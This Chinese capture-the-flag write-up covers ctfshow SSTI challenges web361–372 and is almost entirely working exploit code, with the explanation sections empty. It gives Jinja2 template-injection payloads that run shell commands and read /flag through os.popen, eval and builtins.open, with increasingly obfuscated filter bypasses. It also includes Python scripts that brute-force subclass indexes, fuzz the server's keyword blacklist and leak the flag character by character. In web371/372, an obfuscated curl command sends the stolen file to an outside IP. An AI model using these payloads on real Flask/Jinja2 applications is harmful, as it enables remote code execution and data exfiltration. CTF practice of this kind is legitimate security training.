# 原创
：  ctfshow web入门-SSTI

# ctfshow web入门-SSTI

#### ctfshow web入门-SSTI

## web361

### 题目描述

> 



### 解题思路

> 



```
''.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()
或者
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("cat /flag").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}

```

> 



```
import requests
from tqdm import tqdm

url = 'http://c019cb84-3254-4af1-bc56-f8bb3d483c7c.challenge.ctf.show:8080/?name='
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}
for i in tqdm(range(500)):    
    url = url + "{{''.__class__.__mro__[-1].__subclasses__()[" + str(i) + "]}}"
    res = requests.get(url=url, headers=headers)
    if 'os._wrap_close' in res.text:
        print(i)
        break

```

## web362

### 题目描述

> 



### 解题思路

> 



```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("cat /flag").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}

```

## web363

### 题目描述

> 



### 解题思路

> 



```
import requests
from tqdm import tqdm

url = 'http://889a9ec1-3a91-4e11-925e-3bde2e60fb4a.challenge.ctf.show:8080/?name='

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
fuzzList = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','０','１','２','３','４','５','６','７','８','９','\\','\'','\"','.','+','{','{{','%','#','if','for','class','(',')','[',']','base','bases','mro','_','__','init','globals','subclasses','popen','import','os','dir','builtins','config','get_flashed_messages','current_app','attr','getattr','request','chr','join','|','replace','decode','enter','exit','pop','getitem','args','url_for','range','session','dict','self','reload','count','length','print','curl']
blackList = []
for fuzz in tqdm(fuzzList):
    res = requests.get(url=(url+fuzz), headers=headers)
    if ':(' in res.text:
        blackList.append(fuzz)
print("blackList is ", end="")
print(blackList)

```

> 



```
{{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}&amp;a=os&amp;b=popen&amp;c=cat%20/flag

```

## web364

### 题目描述

> 



### 解题思路

> 



```
{{url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}
Cookie：a=os&amp;b=popen&amp;c=cat%20/flag

```

## web365

### 题目描述

> 



### 解题思路

> 



```
{{url_for.__globals__.os.popen(request.cookies.c).read()}}
Cookie：c=cat%20/flag

```

## web366

### 题目描述

> 



### 解题思路

> 



```
{{(lipsum|attr(request.cookies.globals)).os.popen(request.cookies.flag).read()}}
Cookie：globals=__globals__&amp;flag=cat%20/flag

```

## web367

### 题目描述

> 



### 解题思路

> 



```
{{(lipsum|attr(request.values.globals)).get(request.values.a).popen(request.values.flag).read()}}&amp;globals=__globals__&amp;a=os&amp;flag=cat%20/flag

```

## web368

### 题目描述

> 



### 解题思路

> 



```
{% print((lipsum|attr(request.values.globals)).get(request.values.a).popen(request.values.flag).read()) %}&amp;globals=__globals__&amp;a=os&amp;flag=cat%20/flag

```

> 



```
import requests

url="http://3db27dbc-dccc-46d0-bc78-eff3fc21af74.chall.ctf.show:8080/"
flag=""
for i in range(1,100):
    for j in "abcdefghijklmnopqrstuvwxyz0123456789-{}":
        params={
            'name':"{{% set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read({}) %}}{{% if a==request.values.d %}}H3rmesk1t{{% endif %}}".format(i),
            'a':'__globals__',
            'b':'__builtins__',
            'c':'/flag',
            'd':f'{flag+j}'
        }
        r=requests.get(url=url,params=params)
        if "H3rmesk1t" in r.text:
            flag+=j
            print(flag)
            if j=="}":
                exit()
            break

```

## web369

### 题目描述

> 



### 解题思路

> 



> 



```
import requests
from tqdm import tqdm

url = 'http://520dba47-0b81-4ed7-b420-33cc1ce8fa2f.challenge.ctf.show:8080/?name='
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
wordNeed = '_'
for i in tqdm(range(100)):
    url1 = "{%" + "set po=dict(po=a,p=a)|join() %}{%" + " set a=(()|select|string|list)|attr(po)("
    url2 = ") %}{% print(a) %}"
    res = requests.get(url=(url+url1+str(i)+url2),headers=headers)
    location=res.text.find("&lt;h3&gt;")
    word=res.text[location+4:location+5]
    if word == wordNeed:
        print(i,word)

```

> 



```
{% set po=dict(po=a,p=a)|join() %}
{% set a=(()|select|string|list)|attr(po)(24) %}
{% set ini=(a,a,dict(init=a)|join(),a,a)|join() %}
{% set glob=(a,a,dict(globals=a)|join(),a,a)|join() %}
{% set geti=(a,a,dict(getitem=a)|join(),a,a)|join() %}
{% set built=(a,a,dict(builtins=a)|join(),a,a)|join() %}
{% set x=(q|attr(ini)|attr(glob)|attr(geti))(built) %}
{% set chr=x.chr %}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103) %}
{% print(x.open(file).read()) %}
或者
{% set o=dict(o=oo,s=ss)|join() %}
{% set po=dict(po=a,p=a)|join() %}
{% set a=(()|select|string|list)|attr(po)(24) %}
{% set glob=(a,a,dict(globals=a)|join(),a,a)|join() %}
{% set built=(a,a,dict(builtins=a)|join(),a,a)|join() %}
{% set x=(lipsum|attr(glob)).get(built) %}
{% set chr=x.chr %}
{% print(x.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read()) %}

```

## web370

### 题目描述

> 



### 解题思路

> 



> 



```
{% set c=(dict(e=a)|join()|count) %}
{% set cc=(dict(ee=a)|join()|count) %}
{% set ccc=(dict(eee=a)|join()|count) %}
{% set cccc=(dict(eeee=a)|join()|count) %}
{% set ccccccc=(dict(eeeeeee=a)|join()|count) %}
{% set cccccccc=(dict(eeeeeeee=a)|join()|count) %}
{% set ccccccccc=(dict(eeeeeeeee=a)|join()|count) %}
{% set cccccccccc=(dict(eeeeeeeeee=a)|join()|count) %}
{% set coun=(cc~cccc)|int %}
{% set po=dict(po=a,p=a)|join() %}
{% set a=(()|select|string|list)|attr(po)(coun) %}
{% set ini=(a,a,dict(init=a)|join(),a,a)|join() %}
{% set glo=(a,a,dict(globals=a)|join(),a,a)|join() %}
{% set geti=(a,a,dict(getitem=a)|join(),a,a)|join() %}
{% set built=(a,a,dict(builtins=a)|join(),a,a)|join() %}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built) %}
{% set chr=x.chr%}
{% set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int) %}
{% print(x.open(file).read()) %}

```

## web371

### 题目描述

> 



### 解题思路

> 



```
{% set b=(t|length)%}
{% set c=dict(c=z)|join|length %}
{% set cc=dict(cc=z)|join|length %}
{% set ccc=dict(ccc=z)|join|length %}
{% set cccc=dict(cccc=z)|join|length %}
{% set ccccc=dict(ccccc=z)|join|length %}
{% set cccccc=dict(cccccc=z)|join|length %}
{% set ccccccc=dict(ccccccc=z)|join|length %}
{% set cccccccc=dict(cccccccc=z)|join|length %}
{% set ccccccccc=dict(ccccccccc=z)|join|length %}
{% set cccccccccc=dict(cccccccccc=z)|join|length %}
{% set space=(()|select|string|list).pop(ccccc*cc) %}
{% set xhx=(()|select|string|list).pop(ccc*cccccccc) %}
{% set point=(config|string|list).pop(cccccccccc*cc*cccccccccc-ccccccccc) %}
{% set maohao=(config|string|list).pop(cc*ccccccc) %}
{% set xiegang=(config|string|list).pop(-cccccccc*cccccccc) %}
{% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %}
{% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %}
{% set open=(lipsum|attr(globals)).get(builtins).open %}
{% set result=open((xiegang,dict(flag=z)|join)|join).read() %}
{% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,ccc,ccccccccc,ccccc,point,cc,cccccccccc,ccccc,point,c,cccc,ccccccccc,point,c,b,cccccc,maohao,ccccccccc,cccccccc,ccccccc,ccccccccc,xiegang,result)|join %} 
{% set ohs=dict(o=z,s=z)|join %}
{% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %}

```

## web372

### 题目描述

> 



### 解题思路

> 



```
{% set b=(t|length)%}
{% set c=dict(c=z)|join|length %}
{% set cc=dict(cc=z)|join|length %}
{% set ccc=dict(ccc=z)|join|length %}
{% set cccc=dict(cccc=z)|join|length %}
{% set ccccc=dict(ccccc=z)|join|length %}
{% set cccccc=dict(cccccc=z)|join|length %}
{% set ccccccc=dict(ccccccc=z)|join|length %}
{% set cccccccc=dict(cccccccc=z)|join|length %}
{% set ccccccccc=dict(ccccccccc=z)|join|length %}
{% set cccccccccc=dict(cccccccccc=z)|join|length %}
{% set space=(()|select|string|list).pop(ccccc*cc) %}
{% set xhx=(()|select|string|list).pop(ccc*cccccccc) %}
{% set point=(config|string|list).pop(cccccccccc*cc*cccccccccc-ccccccccc) %}
{% set maohao=(config|string|list).pop(cc*ccccccc) %}
{% set xiegang=(config|string|list).pop(-cccccccc*cccccccc) %}
{% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %}
{% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %}
{% set open=(lipsum|attr(globals)).get(builtins).open %}
{% set result=open((xiegang,dict(flag=z)|join)|join).read() %}
{% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,ccc,ccccccccc,ccccc,point,cc,cccccccccc,ccccc,point,c,cccc,ccccccccc,point,c,b,cccccc,maohao,ccccccccc,cccccccc,ccccccc,ccccccccc,xiegang,result)|join %} 
{% set ohs=dict(o=z,s=z)|join %}
{% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %}

```

## trick

> 



```
def half2full(half):  
    full = ''  
    for ch in half:  
        if ord(ch) in range(33, 127):  
            ch = chr(ord(ch) + 0xfee0)  
        elif ord(ch) == 32:  
            ch = chr(0x3000)  
        else:  
            pass  
        full += ch  
    return full  
t=''
s="0123456789"
for i in s:
    t+='\''+half2full(i)+'\','
print(t)

```
